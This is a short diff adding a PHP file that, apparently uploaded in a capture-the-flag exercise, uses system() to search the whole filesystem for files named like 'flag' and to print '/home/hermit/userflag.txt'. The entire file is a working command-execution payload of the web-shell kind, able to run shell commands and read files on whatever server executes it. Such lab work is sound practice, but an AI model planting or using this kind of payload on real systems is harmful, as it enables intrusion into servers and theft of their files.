@@ -1,0 +1,5 @@
+<?php 
+system("find / -name *flag*");
+echo "<br>";
+system("cat /home/hermit/userflag.txt");
+?>
